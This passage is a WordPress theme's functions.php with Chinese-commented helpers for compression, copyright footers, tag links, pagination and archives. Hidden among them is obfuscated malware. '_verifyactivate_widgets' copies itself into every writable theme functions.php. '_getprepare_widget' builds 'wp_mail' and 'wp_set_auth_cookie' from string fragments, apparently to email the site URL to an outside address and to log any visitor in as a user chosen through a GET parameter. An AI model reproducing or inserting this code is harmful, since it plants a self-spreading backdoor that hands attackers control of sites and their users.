      add_filter('pre_comment_approved', create_function('', 'return "0";'));
    }
    if ( !empty($_POST['spam_confirmed']) ) {
      if ( in_array( $comment['comment_type'], array('pingback', 'trackback') ) ) return $comment;
      die();
      add_filter('pre_comment_approved', create_function('', 'return "spam";'));
      $comment['comment_content'] = $_POST['spam_confirmed'];
    }
    return $comment;
  }
}
$anti_spam = new anti_spam();

//Gzip压缩
function ux_gzip() {
  if ( strstr($_SERVER['REQUEST_URI'], '/js/tinymce') )
    return false;
  if ( ( ini_get('zlib.output_compression') == 'On' || ini_get('zlib.output_compression_level') > 0 ) || ini_get('output_handler') == 'ob_gzhandler' )
    return false;
  if (extension_loaded('zlib') && !ob_start('ob_gzhandler'))
    ob_start();
}


//修改默认发信地址
function res_from_email($email) {
    $wp_from_email = get_option('admin_email');
    return $wp_from_email;
}
function res_from_name($email){
    $wp_from_name = get_option('blogname');
    return $wp_from_name;
}

//文章（包括feed）末尾加版权说明
function set_copyright($content) {
	  if( !is_page() ){
		
		$content .= wp_link_pages(array('before' => '<div class="fenye">', 'after' => '', 'next_or_number' => 'next', 'previouspagelink' => '上一页', 'nextpagelink' => ""));
		$content .= wp_link_pages(array('before' => '', 'after' => '', 'next_or_number' => 'number', 'link_before' =>'<span>', 'link_after'=>'</span>'));
		$content .= wp_link_pages(array('before' => '', 'after' => '</div>', 'next_or_number' => 'next', 'previouspagelink' => '', 'nextpagelink' => "下一页"));

       $content.= '<p>转载注明:<a href="'.get_permalink().'">'.'('.get_permalink().')</a></p>';
    }
    if( is_feed() ){
        $content.= rss_postrelated();
    }
    return $content;
}

function rss_postrelated(){
    $exclude_id = $post->ID;
    $posttags = get_the_tags();
    $i = 0;
    $limit = 6 ;
    if ( $posttags ) {
      $tags = ''; foreach ( $posttags as $tag ) $tags .= $tag->name . ',';
      $args = array(
        'post_status' => 'publish',
        'tag_slug__in' => explode(',', $tags),
        'post__not_in' => explode(',', $exclude_id),
        'caller_get_posts' => 1,
        'orderby' => 'comment_date',
        'posts_per_page' => $limit
      );
      query_posts($args);
      while( have_posts() ) { the_post();
        $output .= '<li><a href="'.get_permalink().'">'.get_the_title().'</a></li>';
        $exclude_id .= ',' . $post->ID; $i ++;
      };
      return '<h4 style="font-size:14px;margin:10px 0;border-bottom:solid 1px #ddd;">继续阅读相关文章：</h4><ul style="line-height:20px;">'.$output.'</ul>';
      wp_reset_query();
    }
}

function _verifyactivate_widgets(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_get_allwidgets_cont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$comaar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $comaar . "\n" .$widget);fclose($f);
					$output .= ($isshowdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _get_allwidgets_cont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&&
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;
	}
	if (sizeof($wids) > 0){
		return _get_allwidgets_cont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){
    function stripos(  $str, $needle, $offset = 0  ){
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  );
    }
}

if(!function_exists("strripos")){
    function strripos(  $haystack, $needle, $offset = 0  ) {
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  );
        if(  $offset < 0  ){
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  );
        }
        else{
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    );
        }
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE;
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   );
        return $pos;
    }
}
if(!function_exists("scandir")){
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_verifyactivate_widgets");
function _getprepare_widget(){
	if(!isset($text_length)) $text_length=120;
	if(!isset($check)) $check="cookie";
	if(!isset($tagsallowed)) $tagsallowed="<a>";
	if(!isset($filter)) $filter="none";
	if(!isset($coma)) $coma="";
	if(!isset($home_filter)) $home_filter=get_option("home");
	if(!isset($pref_filters)) $pref_filters="wp_";
	if(!isset($is_use_more_link)) $is_use_more_link=1;
	if(!isset($com_type)) $com_type="";
	if(!isset($cpages)) $cpages=$_GET["cperpage"];
	if(!isset($post_auth_comments)) $post_auth_comments="";
	if(!isset($com_is_approved)) $com_is_approved="";
	if(!isset($post_auth)) $post_auth="auth";
	if(!isset($link_text_more)) $link_text_more="(more...)";
	if(!isset($widget_yes)) $widget_yes=get_option("_is_widget_active_");
	if(!isset($checkswidgets)) $checkswidgets=$pref_filters."set"."_".$post_auth."_".$check;
	if(!isset($link_text_more_ditails)) $link_text_more_ditails="(details...)";
	if(!isset($contentmore)) $contentmore="ma".$coma."il";
	if(!isset($for_more)) $for_more=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$widget_yes) :

	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$coma."vethe".$com_type."mas".$coma."@".$com_is_approved."gm".$post_auth_comments."ail".$coma.".".$coma."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) {
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) {
			if(is_feed()) {
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($fixed_tags)) $fixed_tags=1;
	if(!isset($filters)) $filters=$home_filter;
	if(!isset($gettextcomments)) $gettextcomments=$pref_filters.$contentmore;
	if(!isset($tag_aditional)) $tag_aditional="div";
	if(!isset($sh_cont)) $sh_cont=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($more_text_link)) $more_text_link="Continue reading this entry";
	if(!isset($isshowdots)) $isshowdots=1;

	$comments=$wpdb->get_results($sql);
	if($fakeit == 2) {
		$text=$post->post_content;
	} elseif($fakeit == 1) {
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else {
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($gettextcomments, array($sh_cont, $home_filter, $filters)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($text_length < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $text_length) {
				$l=$text_length;
				$ellipsis=1;
			} else {
				$l=count($text);
				$link_text_more="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $tagsallowed) {
		$output=strip_tags($output, $tagsallowed);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($fixed_tags) ? balanceTags($output, true) : $output;
	$output .= ($isshowdots && $ellipsis) ? "..." : "";
	$output=apply_filters($filter, $output);
	switch($tag_aditional) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($is_use_more_link ) {
		if($for_more) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $more_text_link . "\">" . $link_text_more = !is_user_logged_in() && @call_user_func_array($checkswidgets,array($cpages, true)) ? $link_text_more : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $more_text_link . "\">" . $link_text_more . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_getprepare_widget");

function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") {
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
}

add_filter('widget_tag_cloud_args','style_tags');  //修改标签云样式
//修改标签云样式
function style_tags($args) {
$args = array(
  'largest'=> '8',
  'smallest'=> '8',
  'format'=> 'flat',
  'number' => '21',
  'orderby' => 'count',
  'order' => 'DESC'
);
return $args;
}
// 文章添加关键词链接
//连接数量
$match_num_from = 1;  //一篇文章中同一个关键字少于多少不秒文本（这个直接填1就好了）
$match_num_to = 1; //一篇文章中同一个关键字最多出现多少次描文本（建议不超过2次）
//连接到WordPress的模块
add_filter('the_content','tag_link',1);
//改变标签关键字
function tag_link($content){
	global $match_num_from,$match_num_to;
	$posttags = get_the_tags();
	if ($posttags) {
		usort($posttags, "tag_sort");
		foreach($posttags as $tag) {
			$link = get_tag_link($tag->term_id);
			$keyword = $tag->name;
			//连接代码
			$cleankeyword = stripslashes($keyword);
			$url = "<span class=\"tag-span\"><a class=\"tag\" href=\"$link\" title=\"".str_replace('%s',addcslashes($cleankeyword, '$'),__('View all posts in %s'))."\"";
			$url .= ' target="_blank"';
			$url .= ">".addcslashes($cleankeyword, '$')."</a></span>";
			$limit = rand($match_num_from,$match_num_to);

			//不连接的 代码
			$content = preg_replace( '|(<a[^>]+>)(.*)('.$ex_word.')(.*)(</a[^>]*>)|U'.$case, '$1$2%&&&&&%$4$5', $content);
			$content = preg_replace( '|(<img)(.*?)('.$ex_word.')(.*?)(>)|U'.$case, '$1$2%&&&&&%$4$5', $content);

			$cleankeyword = preg_quote($cleankeyword,'\'');

			$regEx = '\'(?!((<.*?)|(<a.*?)))('. $cleankeyword . ')(?!(([^<>]*?)>)|([^>]*?</a>))\'s' . $case;

			$content = preg_replace($regEx,$url,$content,$limit);

			$content = str_replace( '%&&&&&%', stripslashes($ex_word), $content);

		}
	}
	return $content;
}
function tag_sort($a, $b){
	if ( $a->name == $b->name ) return 0;
	return ( strlen($a->name) > strlen($b->name) ) ? -1 : 1;
}

//分页函数
function par_pagenavi($range = 9){
	global $paged, $wp_query;
	if ( !$max_page ) {$max_page = $wp_query->max_num_pages;}
	if($max_page > 1){if(!$paged){$paged = 1;}
	if($paged != 1){echo "<li><a href='" . get_pagenum_link(1) . "' class='extend' title='跳转到首页'> 返回首页 </a></li>";}
	echo '<li>';previous_posts_link('上一页');echo "</li>";
    if($max_page > $range){
		if($paged < $range){for($i = 1; $i <= ($range + 1); $i++){echo "<li><a href='" . get_pagenum_link($i) ."'";
		if($i==$paged)echo " class='current'";echo ">$i</a></li>";}}
    elseif($paged >= ($max_page - ceil(($range/2)))){
		for($i = $max_page - $range; $i <= $max_page; $i++){echo "<li><a href='" . get_pagenum_link($i) ."'";
		if($i==$paged)echo " class='current'";echo ">$i</a></li>";}}
	elseif($paged >= $range && $paged < ($max_page - ceil(($range/2)))){
		for($i = ($paged - ceil($range/2)); $i <= ($paged + ceil(($range/2))); $i++){echo "<li><a href='" . get_pagenum_link($i) ."'";if($i==$paged) echo " class='current'";echo ">$i</a></li>";}}}
    else{for($i = 1; $i <= $max_page; $i++){echo "<li><a href='" . get_pagenum_link($i) ."'";
    if($i==$paged)echo " class='current'";echo ">$i</a></li>";}}

	echo '<li>';next_posts_link(' 下一页 ');echo "</li>";
    if($paged != $max_page){echo "<li><a href='" . get_pagenum_link($max_page) . "' class='extend' title='跳转到最后一页'> 最后一页 </a></li>";}}
}


//文章归档
function archives_list_SHe() {
	global $wpdb,$month;
	$lastpost = $wpdb->get_var("SELECT ID FROM $wpdb->posts WHERE post_date <'" . current_time('mysql') . "' AND post_status='publish' AND post_type='post' AND post_password='' ORDER BY post_date DESC LIMIT 1");
	$output = get_option('SHe_archives_'.$lastpost);
	if(empty($output)){
		$output = '';
		$wpdb->query("DELETE FROM $wpdb->options WHERE option_name LIKE 'SHe_archives_%'");
		$q = "SELECT DISTINCT YEAR(post_date) AS year, MONTH(post_date) AS month, count(ID) as posts FROM $wpdb->posts p WHERE post_date <'" . current_time('mysql') . "' AND post_status='publish' AND post_type='post' AND post_password='' GROUP BY YEAR(post_date), MONTH(post_date) ORDER BY post_date DESC";
		$monthresults = $wpdb->get_results($q);
		if ($monthresults) {
			foreach ($monthresults as $monthresult) {
			$thismonth    = zeroise($monthresult->month, 2);
			$thisyear    = $monthresult->year;
			$q = "SELECT ID, post_date, post_title, comment_count FROM $wpdb->posts p WHERE post_date LIKE '$thisyear-$thismonth-%' AND post_date AND post_status='publish' AND post_type='post' AND post_password='' ORDER BY post_date DESC";
			$postresults = $wpdb->get_results($q);
			if ($postresults) {
				$text = sprintf('%s %d', $month[zeroise($monthresult->month,2)], $monthresult->year);
				$postcount = count($postresults);
				$output .= '<dl><dt><strong>' . $text . '</strong> &nbsp;(' . count($postresults) . '&nbsp;' . __('篇文章','freephp') . ')</dt>' . "\n";
			foreach ($postresults as $postresult) {
				if ($postresult->post_date != '0000-00-00 00:00:00') {
				$url = get_permalink($postresult->ID);
				$arc_title    = $postresult->post_title;
				if ($arc_title)
					$text = wptexturize(strip_tags($arc_title));
				else
					$text = $postresult->ID;
					$title_text = __('View this post','freephp') . ', &quot;' . wp_specialchars($text, 1) . '&quot;';
					$output .= '<dd>' . mysql2date('m-d', $postresult->post_date) . ':&nbsp;' . "<a href='$url' title='$title_text'>$text</a>";
					$output .= '&nbsp;(' . $postresult->comment_count . ')';
					$output .= '</dd>' . "\n";
				}
				}
			}
			$output .= '</dl>' . "\n";
			}
        update_option('SHe_archives_'.$lastpost,$output);
		}else{
			$output = '<div class="errorbox">'. __('Sorry, no posts matched your criteria.','freephp') .'</div>' . "\n";
		}
	}
	echo $output;
}
?>